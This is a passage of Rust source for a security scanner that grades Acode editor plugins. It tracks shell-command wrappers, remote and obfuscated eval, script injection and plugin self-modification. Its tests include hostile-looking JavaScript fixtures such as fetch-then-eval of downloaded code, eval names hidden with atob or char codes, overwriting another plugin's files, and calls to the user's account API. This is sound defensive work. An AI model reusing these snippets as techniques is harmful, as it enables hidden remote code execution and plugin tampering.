                for (index, quasi) in template.quasis.iter().enumerate() {
                    let text = quasi.value.cooked.unwrap_or(quasi.value.raw);
                    parts.push(Part::Text(text.to_string()));
                    if let Some(expr) = template.expressions.get(index) {
                        parts.push(self.builder_part(expr, params));
                    }
                }
                Some(parts)
            }
            Expression::BinaryExpression(binary) if binary.operator == BinaryOperator::Addition => {
                let mut parts = self
                    .builder_parts(&binary.left, params)
                    .unwrap_or_else(|| vec![self.builder_part(&binary.left, params)]);
                parts.extend(
                    self.builder_parts(&binary.right, params)
                        .unwrap_or_else(|| vec![self.builder_part(&binary.right, params)]),
                );
                Some(parts)
            }
            _ => None,
        }
    }

    fn builder_part(&self, expr: &Expression<'_>, params: &[Option<SymbolId>]) -> Part {
        if let Some(index) = self.param_index(expr, params) {
            return Part::Param(index);
        }
        if let Expression::CallExpression(call) = expr.get_inner_expression() {
            let first = call.arguments.first().and_then(Argument::as_expression);
            // `${shellQuote(cmd)}`, `${String(cmd)}`, `${cmd.replace(/"/g, '\\"')}`
            if let Some(index) = first.and_then(|first| self.param_index(first, params)) {
                if let Some(quote) = self
                    .resolver
                    .local_function(&call.callee)
                    .and_then(|symbol| self.resolver.quoters.get(&symbol))
                {
                    return Part::Quoted(index, *quote);
                }
                if self.resolver.resolve(&call.callee).as_deref() == Some("String") {
                    return Part::Param(index);
                }
            }
            if let Expression::StaticMemberExpression(member) = call.callee.get_inner_expression()
                && matches!(
                    member.property.name.as_str(),
                    "replace" | "replaceAll" | "trim"
                )
                && let Some(index) = self.param_index(&member.object, params)
            {
                return Part::Param(index);
            }
        }
        Part::Text(
            self.resolver
                .approx(expr, 0)
                .unwrap_or_else(|| "…".to_string()),
        )
    }
}

/// `return` values of a function body, not of functions nested in it. An
/// arrow with an expression body returns that expression.
fn returned_expressions<'b, 'a>(body: &'b FunctionBody<'a>) -> Vec<&'b Expression<'a>> {
    struct Returns<'b, 'a> {
        found: Vec<&'b Expression<'a>>,
    }
    impl<'b, 'a> Returns<'b, 'a> {
        fn statements(&mut self, statements: &'b [Statement<'a>]) {
            for statement in statements {
                self.statement(statement);
            }
        }
        fn statement(&mut self, statement: &'b Statement<'a>) {
            match statement {
                Statement::ReturnStatement(ret) => {
                    if let Some(argument) = &ret.argument {
                        self.found.push(argument);
                    }
                }
                Statement::BlockStatement(block) => self.statements(&block.body),
                Statement::IfStatement(branch) => {
                    self.statement(&branch.consequent);
                    if let Some(alternate) = &branch.alternate {
                        self.statement(alternate);
                    }
                }
                Statement::TryStatement(attempt) => {
                    self.statements(&attempt.block.body);
                    if let Some(handler) = &attempt.handler {
                        self.statements(&handler.body.body);
                    }
                }
                _ => {}
            }
        }
    }
    let mut returns = Returns { found: Vec::new() };
    returns.statements(&body.statements);
    if returns.found.is_empty()
        && let [Statement::ExpressionStatement(only)] = body.statements.as_slice()
    {
        returns.found.push(&only.expression);
    }
    returns.found
}

fn flatten_branches<'b, 'a>(expr: &'b Expression<'a>, out: &mut Vec<&'b Expression<'a>>) {
    match expr.get_inner_expression() {
        Expression::ConditionalExpression(conditional) => {
            flatten_branches(&conditional.consequent, out);
            flatten_branches(&conditional.alternate, out);
        }
        Expression::LogicalExpression(logical) => {
            flatten_branches(&logical.left, out);
            flatten_branches(&logical.right, out);
        }
        other => out.push(other),
    }
}

/// `'${s.replace(/'/g, "'\\''")}'` or `"'" + s.replace(…) + "'"`.
fn quote_helper(expr: &Expression<'_>, _param: SymbolId, _resolver: &Resolver<'_>) -> Option<char> {
    let is_replace = |expr: &Expression<'_>| {
        matches!(expr.get_inner_expression(), Expression::CallExpression(call)
            if matches!(call.callee.get_inner_expression(), Expression::StaticMemberExpression(member)
                if matches!(member.property.name.as_str(), "replace" | "replaceAll")))
    };
    let quote = |text: &str| match text {
        "'" => Some('\''),
        "\"" => Some('"'),
        _ => None,
    };
    match expr.get_inner_expression() {
        Expression::TemplateLiteral(template)
            if template.quasis.len() == 2 && template.expressions.len() == 1 =>
        {
            let open = template.quasis[0].value.raw.as_str();
            let close = template.quasis[1].value.raw.as_str();
            (open == close && is_replace(&template.expressions[0]))
                .then(|| quote(open))
                .flatten()
        }
        Expression::BinaryExpression(outer) if outer.operator == BinaryOperator::Addition => {
            let Expression::BinaryExpression(inner) = outer.left.get_inner_expression() else {
                return None;
            };
            let (Expression::StringLiteral(open), Expression::StringLiteral(close)) = (
                inner.left.get_inner_expression(),
                outer.right.get_inner_expression(),
            ) else {
                return None;
            };
            (open.value == close.value && is_replace(&inner.right))
                .then(|| quote(open.value.as_str()))
                .flatten()
        }
        _ => None,
    }
}

impl<'a> Visit<'a> for AliasCollector<'_, '_> {
    fn visit_variable_declarator(&mut self, it: &VariableDeclarator<'a>) {
        if let Some(init) = &it.init {
            let path = self.resolver.resolve(init);
            self.bind(&it.id, Some(init), path);
            if let BindingPattern::BindingIdentifier(binding) = &it.id
                && let Some(symbol) = binding.symbol_id.get()
            {
                let key = WrapperKey::Function(symbol);
                match init.get_inner_expression() {
                    Expression::ArrowFunctionExpression(arrow) => {
                        self.function(key, &arrow.params, &arrow.body)
                    }
                    Expression::FunctionExpression(function) => {
                        if let Some(body) = &function.body {
                            self.function(key, &function.params, body);
                        }
                    }
                    _ => {}
                }
            }
        }
        walk::walk_variable_declarator(self, it);
    }

    fn visit_function(&mut self, it: &Function<'a>, flags: ScopeFlags) {
        if let (Some(id), Some(body)) = (&it.id, &it.body)
            && let Some(symbol) = id.symbol_id.get()
        {
            self.function(WrapperKey::Function(symbol), &it.params, body);
        }
        walk::walk_function(self, it, flags);
    }

    fn visit_method_definition(&mut self, it: &MethodDefinition<'a>) {
        if let (Some(name), Some(body)) = (it.key.static_name(), &it.value.body) {
            self.function(WrapperKey::Method(name.to_string()), &it.value.params, body);
        }
        walk::walk_method_definition(self, it);
    }
}

/// Counts method names, so `this.name(...)` is only followed when one
/// method in the file has that name.
struct MethodCounter<'r> {
    counts: &'r mut HashMap<String, usize>,
}

impl<'a> Visit<'a> for MethodCounter<'_> {
    fn visit_method_definition(&mut self, it: &MethodDefinition<'a>) {
        if let Some(name) = it.key.static_name() {
            *self.counts.entry(name.to_string()).or_default() += 1;
        }
        walk::walk_method_definition(self, it);
    }

    fn visit_property_definition(&mut self, it: &PropertyDefinition<'a>) {
        if let Some(name) = it.key.static_name() {
            *self.counts.entry(name.to_string()).or_default() += 1;
        }
        walk::walk_property_definition(self, it);
    }

    fn visit_object_property(&mut self, it: &ObjectProperty<'a>) {
        if let Some(name) = it.key.static_name() {
            *self.counts.entry(name.to_string()).or_default() += 1;
        }
        walk::walk_object_property(self, it);
    }
}

/// Finds helpers like `const sh = (cmd) => Executor.execute(cmd, true)` so
/// each call `sh("uname -m")` is graded by its own command, instead of one
/// "command built at runtime" finding inside the helper.
///
/// When every use of a helper is a direct call it is "closed": all the
/// commands it can run were seen, so the sink inside it is not reported on
/// its own. Plain functions must not be top-level (other scripts could call
/// them), and methods count only when called as `this.name(...)`, with one
/// definition of that name in the file and no other use of it.
fn collect_shell_wrappers(resolver: &mut Resolver<'_>, program: &oxc_ast::ast::Program<'_>) {
    let mut found: HashMap<WrapperKey, (Wrapper, Vec<u32>)> = HashMap::new();
    for _ in 0..3 {
        let mut collector = WrapperCollector {
            resolver,
            known: &found,
            owners: HashMap::new(),
            frames: Vec::new(),
            new: Vec::new(),
            uses: WrapperUses::default(),
        };
        collector.visit_program(program);
        let (new, uses) = (collector.new, collector.uses);
        let before = found.len();
        for (key, wrapper, span) in new {
            found
                .entry(key)
                .or_insert_with(|| (wrapper, Vec::new()))
                .1
                .push(span);
        }
        for spans in found.values_mut() {
            spans.1.sort_unstable();
            spans.1.dedup();
        }
        let done = found.len() == before;
        if done {
            for (key, (wrapper, spans)) in &found {
                if uses.closed(resolver.scoping, key) {
                    resolver.covered.extend(spans.iter().copied());
                }
                resolver.wrappers.insert(key.clone(), wrapper.clone());
            }
            return;
        }
    }
    for (key, (wrapper, _)) in found {
        resolver.wrappers.insert(key, wrapper);
    }
}

#[derive(Default)]
struct WrapperUses {
    function_calls: HashMap<SymbolId, usize>,
    method_calls: HashMap<String, usize>,
    member_mentions: HashMap<String, usize>,
    method_definitions: HashMap<String, usize>,
    string_mentions: HashMap<String, usize>,
}

impl WrapperUses {
    fn closed(&self, scoping: &Scoping, key: &WrapperKey) -> bool {
        match key {
            WrapperKey::Function(symbol) => {
                let references = scoping.get_resolved_reference_ids(*symbol).len();
                scoping.symbol_scope_id(*symbol) != scoping.root_scope_id()
                    && !scoping.symbol_is_mutated(*symbol)
                    && references > 0
                    && self.function_calls.get(symbol).copied().unwrap_or(0) == references
            }
            WrapperKey::Method(name) => {
                let calls = self.method_calls.get(name).copied().unwrap_or(0);
                calls > 0
                    && self.method_definitions.get(name).copied().unwrap_or(0) == 1
                    && self.member_mentions.get(name).copied().unwrap_or(0) == calls
                    && !self.string_mentions.contains_key(name)
            }
        }
    }
}

struct WrapperFrame {
    owner: Option<WrapperKey>,
    params: Vec<Option<SymbolId>>,
}

struct WrapperCollector<'w, 'r, 's> {
    resolver: &'r Resolver<'s>,
    known: &'w HashMap<WrapperKey, (Wrapper, Vec<u32>)>,
    /// Function span start → the name it is bound to.
    owners: HashMap<u32, WrapperKey>,
    frames: Vec<WrapperFrame>,
    new: Vec<(WrapperKey, Wrapper, u32)>,
    uses: WrapperUses,
}

/// The wrapper a call goes through, if its callee is one.
fn wrapper_key(resolver: &Resolver<'_>, callee: &Expression<'_>) -> Option<WrapperKey> {
    match callee.get_inner_expression() {
        Expression::Identifier(ident) => resolver.symbol(ident).map(WrapperKey::Function),
        Expression::StaticMemberExpression(member)
            if matches!(
                member.object.get_inner_expression(),
                Expression::ThisExpression(_)
            ) =>
        {
            Some(WrapperKey::Method(member.property.name.to_string()))
        }
        _ => None,
    }
}

impl WrapperCollector<'_, '_, '_> {
    fn enter(&mut self, span_start: u32, params: &FormalParameters<'_>) {
        let params = params
            .items
            .iter()
            .map(|param| match &param.pattern {
                BindingPattern::BindingIdentifier(binding) => binding.symbol_id.get(),
                _ => None,
            })
            .collect();
        self.frames.push(WrapperFrame {
            owner: self.owners.get(&span_start).cloned(),
            params,
        });
    }

    fn own(&mut self, expr: &Expression<'_>, key: WrapperKey) {
        if matches!(
            expr.get_inner_expression(),
            Expression::ArrowFunctionExpression(_) | Expression::FunctionExpression(_)
        ) {
            self.owners
                .insert(expr.get_inner_expression().span().start, key);
        }
    }
}

impl<'a> Visit<'a> for WrapperCollector<'_, '_, '_> {
    fn visit_variable_declarator(&mut self, it: &VariableDeclarator<'a>) {
        if let (BindingPattern::BindingIdentifier(binding), Some(init)) = (&it.id, &it.init)
            && let Some(symbol) = binding.symbol_id.get()
        {
            self.own(init, WrapperKey::Function(symbol));
        }
        walk::walk_variable_declarator(self, it);
    }

    fn visit_method_definition(&mut self, it: &MethodDefinition<'a>) {
        if let Some(name) = it.key.static_name() {
            *self
                .uses
                .method_definitions
                .entry(name.to_string())
                .or_default() += 1;
            self.owners
                .insert(it.value.span.start, WrapperKey::Method(name.to_string()));
        }
        walk::walk_method_definition(self, it);
    }

    fn visit_property_definition(&mut self, it: &PropertyDefinition<'a>) {
        if let (Some(name), Some(value)) = (it.key.static_name(), &it.value) {
            *self
                .uses
                .method_definitions
                .entry(name.to_string())
                .or_default() += 1;
            self.own(value, WrapperKey::Method(name.to_string()));
        }
        walk::walk_property_definition(self, it);
    }

    fn visit_object_property(&mut self, it: &ObjectProperty<'a>) {
        if let Some(name) = it.key.static_name() {
            *self
                .uses
                .method_definitions
                .entry(name.to_string())
                .or_default() += 1;
            self.own(&it.value, WrapperKey::Method(name.to_string()));
        }
        walk::walk_object_property(self, it);
    }

    fn visit_function(&mut self, it: &Function<'a>, flags: ScopeFlags) {
        if let Some(symbol) = it.id.as_ref().and_then(|id| id.symbol_id.get()) {
            self.owners
                .entry(it.span.start)
                .or_insert(WrapperKey::Function(symbol));
        }
        self.enter(it.span.start, &it.params);
        walk::walk_function(self, it, flags);
        self.frames.pop();
    }

    fn visit_arrow_function_expression(&mut self, it: &ArrowFunctionExpression<'a>) {
        self.enter(it.span.start, &it.params);
        walk::walk_arrow_function_expression(self, it);
        self.frames.pop();
    }

    fn visit_call_expression(&mut self, it: &CallExpression<'a>) {
        let key = wrapper_key(self.resolver, &it.callee);
        match &key {
            Some(WrapperKey::Function(symbol)) => {
                *self.uses.function_calls.entry(*symbol).or_default() += 1;
            }
            Some(WrapperKey::Method(name)) => {
                *self.uses.method_calls.entry(name.clone()).or_default() += 1;
            }
            None => {}
        }

        // (sink, which argument of this call is the command, its index in the sink)
        let target = self
            .resolver
            .resolve(&it.callee)
            .and_then(|path| shell_sink(&path).map(|index| (path, index, index)))
            .or_else(|| {
                let (wrapper, _) = self.known.get(key.as_ref()?)?;
                Some((wrapper.sink.clone(), wrapper.param, wrapper.sink_index))
            });
        // The sink may sit in a callback inside the helper
        // (`new Promise(res => Executor.start(cmd, …))`): the command is still
        // the helper's parameter, so look outward for the frame that owns it.
        if let Some((sink, index, sink_index)) = target
            && let Some(Expression::Identifier(ident)) = it
                .arguments
                .get(index)
                .and_then(Argument::as_expression)
                .map(Expression::get_inner_expression)
            && let Some(symbol) = self.resolver.symbol(ident)
            && let Some((frame, param)) = self.frames.iter().rev().find_map(|frame| {
                frame
                    .params
                    .iter()
                    .position(|p| *p == Some(symbol))
                    .map(|param| (frame, param))
            })
            && let Some(owner) = &frame.owner
            && !self.resolver.scoping.symbol_is_mutated(symbol)
        {
            self.new.push((
                owner.clone(),
                Wrapper {
                    param,
                    sink,
                    sink_index,
                },
                it.span.start,
            ));
        }
        walk::walk_call_expression(self, it);
    }

    fn visit_static_member_expression(&mut self, it: &StaticMemberExpression<'a>) {
        *self
            .uses
            .member_mentions
            .entry(it.property.name.to_string())
            .or_default() += 1;
        walk::walk_static_member_expression(self, it);
    }

    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        if it.value.len() < 64 {
            *self
                .uses
                .string_mentions
                .entry(it.value.to_string())
                .or_default() += 1;
        }
    }
}

struct Scanner<'c, 'a, 'r, 's> {
    ctx: &'c mut RuleContext<'a>,
    resolver: &'r Resolver<'s>,
    remote_callback_depth: usize,
}

impl Scanner<'_, '_, '_, '_> {
    fn callee_path(&self, callee: &Expression<'_>) -> String {
        if let Some(path) = self.resolver.resolve(callee) {
            return path;
        }
        match callee.get_inner_expression() {
            Expression::StaticMemberExpression(member) => {
                let name = member.property.name.as_str();
                let object = member.object.get_inner_expression();
                let indirect_constructor = name == "constructor"
                    && (matches!(
                        object,
                        Expression::FunctionExpression(_) | Expression::ArrowFunctionExpression(_)
                    ) || matches!(object, Expression::StaticMemberExpression(inner) if inner.property.name.as_str() == "constructor"));
                if indirect_constructor {
                    "$indirect_function_constructor".to_string()
                } else {
                    format!("$unknown.{name}")
                }
            }
            _ => "$unknown".to_string(),
        }
    }

    /// `fetch(url).then(r => r.text()).then(code => eval(code))`
    fn is_then_on_remote(&self, call: &CallExpression<'_>) -> bool {
        let Expression::StaticMemberExpression(member) = call.callee.get_inner_expression() else {
            return false;
        };
        member.property.name.as_str() == "then" && self.resolver.probe(&member.object).remote
    }

    /// `f.call(t, a)`, `f.apply(t, [a])`, `f.bind(t)(a)`, `Reflect.apply(f, t, [a])`
    /// and `Reflect.construct(f, [a])` all call `f` with `a`.
    fn unwrap_indirect_call(
        &self,
        path: &str,
        call: &CallExpression<'_>,
        args: &[Arg],
    ) -> Option<(String, Vec<Arg>)> {
        let reflect_list = match path {
            "Reflect.apply" => Some(2),
            "Reflect.construct" => Some(1),
            _ => None,
        };
        if let Some(index) = reflect_list {
            let target = args.first()?.path.clone()?;
            return Some((target, self.array_args(call.arguments.get(index))));
        }
        if let Some(target) = path.strip_suffix(".call") {
            return Some((target.to_string(), args.iter().skip(1).cloned().collect()));
        }
        if let Some(target) = path.strip_suffix(".apply") {
            return Some((target.to_string(), self.array_args(call.arguments.get(1))));
        }
        let target = path.strip_suffix(".bind()")?;
        Some((target.to_string(), args.to_vec()))
    }

    /// Arguments passed as one array. An array that isn't a literal still
    /// carries its taint, as a single unknown argument.
    fn array_args(&self, argument: Option<&Argument<'_>>) -> Vec<Arg> {
        let Some(expr) = argument.and_then(Argument::as_expression) else {
            return Vec::new();
        };
        match expr.get_inner_expression() {
            Expression::ArrayExpression(array) => array
                .elements
                .iter()
                .map(|element| {
                    element
                        .as_expression()
                        .map(|expr| self.resolver.arg_info(expr))
                        .unwrap_or_default()
                })
                .collect(),
            _ => vec![Arg {
                value: None,
                approx: None,
                ..self.resolver.arg_info(expr)
            }],
        }
    }

    fn classify(&mut self, path: &str, span: Span, args: &[Arg]) {
        self.classify_via(path, span, args, false);
    }

    fn classify_via(&mut self, path: &str, span: Span, args: &[Arg], via_helper: bool) {
        rules::classify_call(
            self.ctx,
            &Call {
                path,
                span,
                args,
                in_remote_callback: self.remote_callback_depth > 0,
                via_helper,
            },
        );
    }

    fn classify_assignment(&mut self, span: Span, target: &str, value: &Expression<'_>) {
        rules::classify_tamper_target(self.ctx, span, target, "assigns");

        let Some((element, property)) = target
            .strip_prefix("$element:")
            .and_then(|rest| rest.split_once('.'))
        else {
            return;
        };
        if element != "script" {
            return;
        }
        let info = self.resolver.arg_info(value);
        match property {
            "src" => {
                if info.text().is_some_and(rules::is_remote_url) {
                    self.ctx.add(
                        "dynamic.remote_script",
                        Severity::High,
                        Category::DynamicCode,
                        Some(span),
                        "Loads a <script> from a remote URL (code reviewers never see)",
                        info.text().unwrap_or_default(),
                    );
                }
            }
            "text" | "textContent" | "innerHTML" | "innerText" => {
                let (id, severity, message) = if info.remote || self.remote_callback_depth > 0 {
                    (
                        "dynamic.remote_code",
                        Severity::Critical,
                        "Runs downloaded code through an inline <script>",
                    )
                } else if info.decoded {
                    (
                        "dynamic.decoded_exec",
                        Severity::High,
                        "Runs decoded text through an inline <script>",
                    )
                } else if info.value.is_some() {
                    return;
                } else {
                    (
                        "dynamic.inline_script",
                        Severity::Medium,
                        "Fills an inline <script> with code built at runtime",
                    )
                };
                let evidence = self.ctx.snippet(span);
                self.ctx.add(
                    id,
                    severity,
                    Category::DynamicCode,
                    Some(span),
                    message,
                    evidence,
                );
            }
            _ => {}
        }
    }
}

impl<'a> Visit<'a> for Scanner<'_, '_, '_, '_> {
    fn visit_call_expression(&mut self, it: &CallExpression<'a>) {
        let path = self.callee_path(&it.callee);
        let args: Vec<Arg> = it
            .arguments
            .iter()
            .map(|argument| self.resolver.argument_info(argument))
            .collect();
        if self.resolver.covered.contains(&it.span.start) {
            // A sink inside a helper whose every call was graded on its own.
        } else if let Some(wrapper) =
            wrapper_key(self.resolver, &it.callee).and_then(|key| self.resolver.wrappers.get(&key))
        {
            let mut sink_args = vec![Arg::default(); wrapper.sink_index + 1];
            sink_args[wrapper.sink_index] = args.get(wrapper.param).cloned().unwrap_or_default();
            let sink = wrapper.sink.clone();
            self.classify_via(&sink, it.span, &sink_args, true);
        } else {
            match self.unwrap_indirect_call(&path, it, &args) {
                Some((target, target_args)) => self.classify(&target, it.span, &target_args),
                None => self.classify(&path, it.span, &args),
            }
        }

        let remote_then = self.is_then_on_remote(it);
        if remote_then {
            // `.then(eval)` / `.then(Function)`
            for arg in &args {
                if matches!(arg.path.as_deref(), Some("eval" | "Function")) {
                    let remote = Arg {
                        remote: true,
                        ..Arg::default()
                    };
                    self.classify(arg.path.as_deref().unwrap_or("eval"), it.span, &[remote]);
                }
            }
            self.remote_callback_depth += 1;
        }
        walk::walk_call_expression(self, it);
        if remote_then {
            self.remote_callback_depth -= 1;
        }
    }

    fn visit_new_expression(&mut self, it: &NewExpression<'a>) {
        let path = self.callee_path(&it.callee);
        let args: Vec<Arg> = it
            .arguments
            .iter()
            .map(|argument| self.resolver.argument_info(argument))
            .collect();
        self.classify(&path, it.span, &args);
        walk::walk_new_expression(self, it);
    }

    fn visit_import_expression(&mut self, it: &ImportExpression<'a>) {
        let source = self.resolver.arg_info(&it.source);
        rules::classify_import(self.ctx, it.span, Some(&source));
        walk::walk_import_expression(self, it);
    }

    fn visit_assignment_expression(&mut self, it: &AssignmentExpression<'a>) {
        let target = match &it.left {
            AssignmentTarget::AssignmentTargetIdentifier(ident) => {
                if self.resolver.symbol(ident).is_none() {
                    Some(ident.name.to_string())
                } else {
                    None
                }
            }
            other => other
                .as_member_expression()
                .and_then(|member| self.resolver.member_path(member)),
        };
        let script_element = target
            .as_deref()
            .is_some_and(|target| target.starts_with("$element:script."));
        if let Some(target) = target {
            self.classify_assignment(it.span, &target, &it.right);
        }
        // HTML sinks are usually on local elements the resolver can't name,
        // so they are matched by property alone.
        if !script_element
            && let Some(sink @ ("innerHTML" | "outerHTML" | "srcdoc")) = it
                .left
                .as_member_expression()
                .and_then(|member| member.static_property_name())
        {
            let html = self.resolver.arg_info(&it.right);
            rules::classify_html_sink(
                self.ctx,
                it.span,
                sink,
                &html,
                self.remote_callback_depth > 0,
            );
        }
        walk::walk_assignment_expression(self, it);
    }

    fn visit_identifier_reference(&mut self, it: &IdentifierReference<'a>) {
        if self.resolver.symbol(it).is_none() {
            rules::classify_reference(self.ctx, it.name.as_str(), it.span);
        }
    }

    fn visit_member_expression(&mut self, it: &MemberExpression<'a>) {
        if let Some(path) = self.resolver.member_path(it) {
            rules::classify_reference(self.ctx, &path, it.span());
        }
        walk::walk_member_expression(self, it);
    }

    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        rules::classify_string(self.ctx, it.value.as_str(), it.span);
    }

    fn visit_template_literal(&mut self, it: &TemplateLiteral<'a>) {
        for quasi in &it.quasis {
            let text = quasi.value.cooked.unwrap_or(quasi.value.raw);
            rules::classify_string(self.ctx, text.as_str(), quasi.span);
        }
        walk::walk_template_literal(self, it);
    }

    fn visit_array_expression(&mut self, it: &ArrayExpression<'a>) {
        let total = it.elements.len();
        if total > 40 {
            let hex_like = it
                .elements
                .iter()
                .filter(|element| is_hex_like(element))
                .count();
            rules::classify_hex_array(self.ctx, it.span, total, hex_like);
        }
        walk::walk_array_expression(self, it);
    }
}

fn is_hex_like(element: &ArrayExpressionElement<'_>) -> bool {
    match element {
        ArrayExpressionElement::NumericLiteral(number) => number
            .raw
            .as_ref()
            .is_some_and(|raw| raw.as_str().starts_with("0x") || raw.as_str().starts_with("0X")),
        ArrayExpressionElement::StringLiteral(string) => {
            let value = string.value.as_str();
            value.len() > 2
                && value.starts_with("0x")
                && value[2..].chars().all(|ch| ch.is_ascii_hexdigit())
        }
        _ => false,
    }
}

/// Blanks everything outside inline `<script>` blocks so spans and line
/// numbers still point into the original HTML file. Returns the JS view and
/// any remote `<script src>` URLs.
pub fn html_scripts(html: &str) -> (String, Vec<String>) {
    let lower = html.to_ascii_lowercase();
    let mut js: Vec<u8> = html
        .bytes()
        .map(|byte| if byte == b'\n' { b'\n' } else { b' ' })
        .collect();
    let mut remote = Vec::new();
    let mut index = 0;
    while let Some(offset) = lower[index..].find("<script") {
        let tag_start = index + offset;
        let Some(tag_len) = lower[tag_start..].find('>') else {
            break;
        };
        let tag_end = tag_start + tag_len + 1;
        let tag = &html[tag_start..tag_end];
        if let Some(src) = attribute(tag, "src")
            && rules::is_remote_url(&src)
        {
            remote.push(src);
        }
        let Some(close) = lower[tag_end..].find("</script") else {
            break;
        };
        let body_end = tag_end + close;
        js[tag_end..body_end].copy_from_slice(&html.as_bytes()[tag_end..body_end]);
        index = body_end;
    }
    (String::from_utf8(js).unwrap_or_default(), remote)
}

fn attribute(tag: &str, name: &str) -> Option<String> {
    let lower = tag.to_ascii_lowercase();
    let start = lower.find(&format!("{name}="))? + name.len() + 1;
    let rest = &tag[start..];
    let value = match rest.chars().next()? {
        quote @ ('"' | '\'') => rest[1..].split(quote).next()?,
        _ => rest
            .split(|ch: char| ch.is_whitespace() || ch == '>')
            .next()?,
    };
    Some(value.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn findings(source: &str) -> Vec<(String, Severity)> {
        findings_for(source, Some("com.example.test"))
    }

    fn findings_for(source: &str, plugin_id: Option<&str>) -> Vec<(String, Severity)> {
        let mut ctx = RuleContext::new("main.js", source, plugin_id);
        analyze(&mut ctx);
        ctx.findings
            .into_iter()
            .map(|finding| (finding.id, finding.severity))
            .collect()
    }

    fn ids(source: &str) -> Vec<String> {
        findings(source).into_iter().map(|(id, _)| id).collect()
    }

    fn has(source: &str, id: &str) -> bool {
        ids(source).iter().any(|found| found == id)
    }

    #[test]
    fn local_names_do_not_match_globals() {
        assert!(!has(
            "function f(system){ system.requestPermission('x') }",
            "native.permission_request"
        ));
        assert!(!has(
            "const fetch = () => 1; fetch('https://a.b')",
            "network.fetch"
        ));
        assert!(!has(
            "function g(e){ e.read(); e.copy(); e.delete(); e.moveTo() }",
            "filesystem.write"
        ));
        assert!(has(
            "system.requestPermission('android.permission.CAMERA')",
            "native.permission_request"
        ));
    }

    #[test]
    fn resolves_window_prefix_and_aliases() {
        assert!(has("window.Executor.execute('ls')", "shell.exec"));
        assert!(has(
            "const w = window; w.Executor.execute('ls')",
            "shell.exec"
        ));
        assert!(has(
            "const { Executor: E } = window; E.execute('ls')",
            "shell.exec"
        ));
        assert!(has(
            "const fs = acode.require('fs'); fs(url).writeFile('x')",
            "filesystem.write"
        ));
        assert!(has(
            "const t = acode.require('Terminal')",
            "shell.terminal_module"
        ));
    }

    #[test]
    fn folds_constant_strings() {
        assert!(has("window['ev' + 'al'](x)", "dynamic.eval"));
        assert!(has("window[atob('ZXZhbA==')](x)", "dynamic.eval"));
        assert!(has(
            "globalThis[String.fromCharCode(101,118,97,108)](x)",
            "dynamic.eval"
        ));
        assert!(has("window[['e','v','a','l'].join('')](x)", "dynamic.eval"));
        assert!(has(
            "window['lave'.split('').reverse().join('')](x)",
            "dynamic.eval"
        ));
        assert!(has("const n = 'eval'; window[n](x)", "dynamic.eval"));
    }

    #[test]
    fn ignores_bundler_global_lookup() {
        assert!(!has(
            "var g = Function('return this')()",
            "dynamic.function_constructor"
        ));
        assert!(!has(
            "var g = new Function('return this')()",
            "dynamic.function_constructor"
        ));
    }

    #[test]
    fn grades_code_execution_by_source() {
        let sev = |source: &str| {
            findings(source)
                .into_iter()
                .filter(|(id, _)| id.starts_with("dynamic."))
                .map(|(_, severity)| severity)
                .max()
        };
        assert_eq!(sev("eval(userCode)"), Some(Severity::Medium));
        assert_eq!(sev("eval(atob(payload))"), Some(Severity::High));
        assert_eq!(
            sev("const s = atob(p); new Function(s)()"),
            Some(Severity::High)
        );
        assert_eq!(
            sev(
                "async function f(){ const r = await fetch(u); const c = await r.text(); eval(c) }"
            ),
            Some(Severity::Critical)
        );
        assert_eq!(
            sev("fetch(u).then(r => r.text()).then(c => eval(c))"),
            Some(Severity::Critical)
        );
        assert_eq!(
            sev("fetch(u).then(r => r.text()).then(eval)"),
            Some(Severity::Critical)
        );
        assert_eq!(
            sev("x.onload = () => eval(x.responseText)"),
            Some(Severity::Critical)
        );
    }

    #[test]
    fn follows_call_apply_bind_and_reflect() {
        assert!(has("eval.call(null, code)", "dynamic.eval"));
        assert!(has("eval.apply(null, [code])", "dynamic.eval"));
        assert!(has(
            "const run = eval.bind(null); run(code)",
            "dynamic.eval"
        ));
        assert!(has("Reflect.apply(eval, null, [code])", "dynamic.eval"));
        assert!(has(
            "Reflect.construct(Function, [code])",
            "dynamic.function_constructor"
        ));
        assert!(has("Executor.execute.call(Executor, 'ls')", "shell.exec"));
        assert!(has(
            "const ex = window.Executor.execute; ex.apply(null, ['ls'])",
            "shell.exec"
        ));
        assert!(has(
            "fetch(u).then(r => r.text()).then(c => eval.call(null, c))",
            "dynamic.remote_code"
        ));
        // The first argument of `call` is `this`, not the code.
        assert!(!has("eval.call('not code')", "dynamic.eval"));
    }

    fn severity_of(source: &str, id: &str) -> Option<Severity> {
        findings(source)
            .into_iter()
            .filter(|(found, _)| found == id)
            .map(|(_, severity)| severity)
            .max()
    }

    #[test]
    fn flags_plugins_that_rewrite_their_own_code() {
        let id = "tampering.self_modify";
        assert_eq!(
            severity_of(
                "fsOperation(Url.join(PLUGIN_DIR, 'com.example.test', 'main.js')).writeFile(code)",
                id
            ),
            Some(Severity::Critical)
        );
        assert_eq!(
            severity_of(
                "acode.setPluginInit('com.example.test', (baseUrl) => fsOperation(baseUrl + 'plugin.json').writeFile(json))",
                id
            ),
            Some(Severity::Critical)
        );
        assert_eq!(
            severity_of(
                "fetch(u).then(r => r.text()).then(c => acode.fsOperation(`${this.baseUrl}chunk.js`).writeFile(c))",
                id
            ),
            Some(Severity::Critical)
        );
        assert_eq!(
            severity_of(
                "const fs = acode.require('fs'); fs(CACHE_STORAGE).createFile('stage.js', data)",
                id
            ),
            Some(Severity::High)
        );
        assert_eq!(
            severity_of(
                "fsOperation(this.baseUrl + 'data.txt').renameTo('x.js')",
                id
            ),
            Some(Severity::High)
        );
        // Settings files in the plugin folder and scripts in user projects are fine.
        assert!(!has(
            "fsOperation(this.baseUrl + 'settings.json').writeFile(json)",
            id
        ));
        assert!(!has(
            "fsOperation(projectDir).createFile('index.js', tpl)",
            id
        ));
        // Another plugin's folder is a different, existing rule.
        assert!(has(
            "fsOperation(Url.join(PLUGIN_DIR, 'victim', 'main.js')).writeFile(code)",
            "tampering.plugin_files"
        ));
    }

    #[test]
    fn flags_use_of_the_users_acode_app_session() {
        assert_eq!(
            severity_of(
                "fetch('https://acode.app/api/comment', { method: 'POST', body })",
                "network.acode_account_write"
            ),
            Some(Severity::High)
        );
        assert!(has(
            "fetch(`https://acode.app/api/plugin/${id}`, { method: 'delete' })",
            "network.acode_account_write"
        ));
        assert!(has(
            "fetch('https://acode.app/api/login')",
            "network.acode_account_read"
        ));
        assert!(has(
            "fetch('https://acode.app/api/user', { headers })",
